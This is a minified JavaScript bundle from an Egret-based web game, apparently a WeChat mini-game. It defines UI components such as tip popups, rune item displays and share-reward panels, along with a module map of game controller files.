__extends(e,t),e.prototype.setLabelText=function(t,e,i){var n,a=this;this._sp.x=0,this._sp.alpha=1,this._bgImg.source="",this._bgImg.source="attr"+t;var r=s.GlobalConfig.AttrConfig[t];if(i?this.bl.text=e+"-"+i:r.divisor?this.bl.text=e/r.divisor+r.suffix:this.bl.text=e+"",this.curLanguage=this.curLanguage||getLangType(),r["width_"+this.curLanguage])this.bl.x=r["width_"+this.curLanguage];else{var l=(null===(n=null===r||void 0===r?void 0:r.name)||void 0===n?void 0:n.length)||0;this.bl.x=this.dic[l]||20*l+20,this.bl.x>this.dic.max&&(this.bl.x=this.dic.max)}egret.Tween.removeTweens(this._sp);var h=egret.Tween.get(this._sp);h.to({alpha:1},500).wait(1300).to({alpha:0,x:-300},500).call(function(){o.DisplayUtils.removeFromParent(a)},this)},e}(n.BaseView);e.AttriteChangeView=a,window.AttriteChangeView=a,__reflect(a.prototype,"AttriteChangeView",[]),window.AttriteChangeView=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BarrageTipsItem=void 0;var n=i(1),o=i(5),s=i(16),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="BarrageSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.bg.width=this.lab.width+40,this.bg.y=0,this.lab.horizontalCenter=0,this.lab.verticalCenter=0,this.setText()},Object.defineProperty(e.prototype,"data",{set:function(t){this._data=t,this.setText(),this.addToEvent||(this.addToEvent=!0,Timer.start(8e3,1,this.removeFromParent,this))},enumerable:!1,configurable:!0}),e.prototype.setText=function(){this.lab&&this._data&&(this.lab.textFlow=o.TextFlowMaker.generateTextFlow(this._data))},e.prototype.removeFromParent=function(){this.addToEvent=!1,s.DisplayUtils.removeFromParent(this),egret.Tween.removeTweens(this),ObjectPool.push(this)},e}(n.BaseView);e.BarrageTipsItem=a,window.BarrageTipsItem=a,__reflect(a.prototype,"BarrageTipsItem",[]),window.BarrageTipsItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CenterTipsItem=void 0;var n=i(274),o=i(5),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.start=function(){this.skin&&(this.lab.textFlow=o.TextFlowMaker.generateTextFlow(this._labelText),this.bg.width=this.lab.width+40,this.bg.scale9Grid=new egret.Rectangle(8,7,7,12),this.bg.source="zjmqipao",this.bg.visible=!0,this.lab.alpha=1,this.bg.y=0,this.lab.horizontalCenter=0,this.lab.verticalCenter=0,this.addToEvent||(this.addToEvent=!0,Timer.start(this.time,1,this.removeFromParent,this)))},Object.defineProperty(e.prototype,"labelText",{set:function(t){this._labelText=t,this.time=5e3,this.start()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"labelText2",{set:function(t){this._labelText=t,this.time=1e3,this.start()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"labelText3",{set:function(t){this._labelText=t,this.time=3e3,this.start()},enumerable:!1,configurable:!0}),e}(n.TipsItem);e.CenterTipsItem=s,window.CenterTipsItem=s,__reflect(s.prototype,"CenterTipsItem",[]),window.CenterTipsItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HintTipsItem=void 0;var n=i(1),o=i(0),s=i(16),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lab.visible=!1,this.bg.visible=!1,this._res&&this.startMovie()},e.prototype.setTips=function(t){this._res=t,this.skinName==this._sn_&&this.startMovie()},e.prototype.startMovie=function(){var t=this;this.pic.source=this._res+"_png",this.pic.alpha=0,this.pic.y=0;var e=egret.Tween.get(this.pic);e.to({alpha:1},500).wait(o.GlobalConfig.ClientGlobalConfig.skillShowTime).to({alpha:0},200).call(function(){s.DisplayUtils.removeFromParent(t)},this)},e}(n.BaseView);e.HintTipsItem=a,window.HintTipsItem=a,__reflect(a.prototype,"HintTipsItem",[]),window.HintTipsItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SceneTipsItem=void 0;var n=i(274),o=i(5),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.time=500,e}return __extends(e,t),Object.defineProperty(e.prototype,"labelText",{set:function(t){this._labelText=t,this.start()},enumerable:!1,configurable:!0}),e.prototype.start=function(){var t=this;this.skin&&(this.lab.textFlow=o.TextFlowMaker.generateTextFlow(this._labelText),this.bg.width=this.lab.width,this.bg.visible=!1,this.lab.alpha=1,this.bg.y=0,this.lab.verticalCenter=-1,Timer.start(500,1,function(){return removeFromParent(t)},this))},e}(n.TipsItem);e.SceneTipsItem=s,window.SceneTipsItem=s,__reflect(s.prototype,"SceneTipsItem",[]),window.SceneTipsItem=s},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneItem=void 0;var n=i(0),o=i(5),s=i(10),a=i(3),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RuneItemSkin",e.icon="",e.pos=-1,e}return __extends(e,t),e.prototype.addDisplay=function(){this.currentState="open",this.addTouchEndEvent(this,this.onClick),this.dataChanged()},e.prototype.dataChanged=function(){var t=this.data.id;t&&this.skin&&this.setDataByItemConfig(n.GlobalConfig.ItemConfig[t])},e.prototype.setDataByItemConfig=function(t){if(t){var e=n.GlobalConfig.RuneNameConfig[s.ItemUtil.getSubType(t)],i=s.ItemUtil.getQuality2(t);t.level&&0!=t.level?this.need=o.TextFlowMaker.generateTextFlow("|C:"+s.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+" Lv."+t.level%100+"|"):this.need=o.TextFlowMaker.generateTextFlow("|C:"+s.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+" Lv.1|"),this.icon=s.ItemUtil.getItemSource(t)}},e.prototype.onClick=function(){win.open("RuneTipsWin",0,this.data.id)},e}(a.BaseItemRender);e.RuneItem=r,window.RuneItem=r,__reflect(r.prototype,"RuneItem",[]),window.RuneItem=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameItem2=void 0;var n=i(3),o=i(176),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eBtn,this.onTap)},e.prototype.onTap=function(){o.ShareCT.ins().sendGetFriends(this.data.id)},e.prototype.dataChanged=function(){var t=o.ShareCT.ins().friends,e=t[this.itemIndex].state;this.eL.dataProvider=new eui.ArrayCollection(this.data.awardList),this.eTxt.text=gettext("第{0}位好友",this.itemIndex+1),e?this.eBtn.label=1==e?gettext("可领取"):gettext("已领取"):this.eBtn.label=gettext("未完成"),this.eBtn.enabled=1==e},e}(n.BaseItemRender);e.WxGameItem2=s,window.WxGameItem2=s,__reflect(s.prototype,"WxGameItem2",[]),window.WxGameItem2=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameShare1=void 0;var n=i(1),o=i(176),s=i(0),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.update,o.ShareCT.ins().shareInfo),this.update()},e.prototype.skinComplete=function(){this.addTouchEvent(this.eFx,this.onTap),this.eList.dataProvider=new eui.ArrayCollection(s.GlobalConfig.ShareBaseConfig.firstAwards)},e.prototype.update=function(){var t=o.ShareCT.ins().firstGet;t&&(this.eFx.label=1==t?gettext("点击领取"):gettext("已领取")),this.eFx.enabled=2!=t},e.prototype.onTap=function(){var t=o.ShareCT.ins().firstGet;return t?void(1==t&&o.ShareCT.ins().sendGetFirst()):void o.ShareCT.ins().share()},e}(n.BaseView);e.WxGameShare1=a,window.WxGameShare1=a,__reflect(a.prototype,"WxGameShare1",[]),window.WxGameShare1=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameShare2=void 0;var n=i(1),o=i(176),s=i(0),a=i(16),r=i(7),l=i(8),h=i(603),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.lastTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eFx,this.share),this.addTouchEvent(this.eGet,this.getDay)},e.prototype.addDisplay=function(){observe(this,this.updateInfo,o.ShareCT.ins().shareInfo),observe(this,this.updateList,o.ShareCT.ins().shareTotal),observe(this,this.updateList,o.ShareCT.ins().friendsLv),this.eList.itemRenderer=h.WxGameItem1,this.updateList(),this.updateInfo()},e.prototype.enterFrame=function(){var t=egret.getTimer();t-this.lastTime>1e3&&(this.updateTimer(),this.lastTime=t)},e.prototype.updateInfo=function(){var t=o.ShareCT.ins(),e=t.dayCount,i=t.dayGet,n=t.dayIndex,r=s.GlobalConfig.ShareBaseConfig.shareNum;this.eL.dataProvider=new eui.ArrayCollection(s.GlobalConfig.dailyShareRewardConfig[n].awardList),this.eFxL.text=gettext("分享次数({0}/{1})",e,r),this.eGet.visible=e>=r,this.eFxL.visible=!this.eGet.visible,this.eGet.label=1==i?gettext("可领取"):gettext("已领取"),this.eGet.enabled=1==i,3==i&&(a.DisplayUtils.removeFromParent(this.eL),a.DisplayUtils.removeFromParent(this.eGet),this.eFxL.text=gettext("每日分享奖励已达到上限"),this.eFxL.right=null,this.eFxL.horizontalCenter=0)},e.prototype.updateList=function(){var t=s.GlobalConfig.AddUpShareConfig,e=[];for(var i in t)("lj"!=this.currentState||2!=t[i].type)&&("lv"!=this.currentState||1!=t[i].type)&&e.push(t[i]);this.eList.dataProvider=new eui.ArrayCollection(e)},e.prototype.updateTimer=function(){var t=o.ShareCT.ins().cdTime,e=t-r.GameServerCC.serverTime;e/=1e3,this.eFx.label=e>=0?l.DateUtils.getFormatBySecond(e,l.DateUtils.TIME_FORMAT_3):gettext("立即分享"),this.eFx.enabled=0>e},e.prototype.share=function(){o.ShareCT.ins().share()},e.prototype.getDay=function(){o.ShareCT.ins().sendGetDay()},e}(n.BaseView);e.WxGameShare2=u,window.WxGameShare2=u,__reflect(u.prototype,"WxGameShare2",[]),window.WxGameShare2=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){function n(t){var e=o(t);return i(e)}function o(t){if(!i.o(s,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return s[t]}var s={"./CC.ts":101,"./game/entity/ActorCC.ts":4,"./game/module/bag/SmeltCC.ts":167,"./game/module/battle/BattleCC.ts":154,"./game/module/camp/CampCC.ts":105,"./game/module/city/CityCC.ts":43,"./game/module/control/ControlCC.ts":53,"./game/module/extremeEquip/ExtremeEquipCC.ts":126,"./game/module/fourgod/FourGodCC.ts":1819,"./game/module/fourgod/ItemTurningCC.ts":1820,"./game/module/godweapon/GodWeaponCC.ts":254,"./game/module/lilian/WeiWangCC.ts":1821,"./game/module/mainui/MainFightCC.ts":100,"./game/module/mainui/MainPotCC.ts":195,"./game/module/mainui/MainUICC.ts":64,"./game/module/merge/model/MergeCC.ts":227,"./game/module/paoDian/PaoDianCC.ts":1822,"./game/module/pet/PetCC.ts":1823,"./game/module/rolewin/WingCC.ts":99,"./game/module/rune/RuneCC.ts":127,"./game/module/samsara/SamsaraCC.ts":1824,"./game/module/server/GameServerCC.ts":7,"./game/module/targetList/TargetListCC.ts":1825,"./game/module/targetPanel/TargetPanelCC.ts":259,"./game/module/treasurehunt/OrangeEquipCC.ts":1826,"./game/module/wxgame/GuanZhuCC.ts":1827};n.keys=function(){return Object.keys(s)},n.resolve=o,t.exports=n,n.id=1818},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuanZhuCC=e.guanzhucc=void 0;var n=i(14),o=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.pfActivity,e.regNetMsg(13,e.guanzhuInfo),window.platform.onShow(e.updateOptions),e}return __extends(e,t),e.prototype.updateOptions=function(t){},e.prototype.sendGetGuanZhu=function(){this.sendBaseProto(13)},e.prototype.guanzhuInfo=function(t){this.getGZ=2==t.readInt()},__decorate([post()],e.prototype,"updateOptions",null),__decorate([post()],e.prototype,"guanzhuInfo",null),e}(n.BaseSystem);e.guanzhucc=o,window.guanzhucc=o,__reflect(o.prototype,"guanzhucc",[]),e.GuanZhuCC=new o,window.guanzhucc=o}]);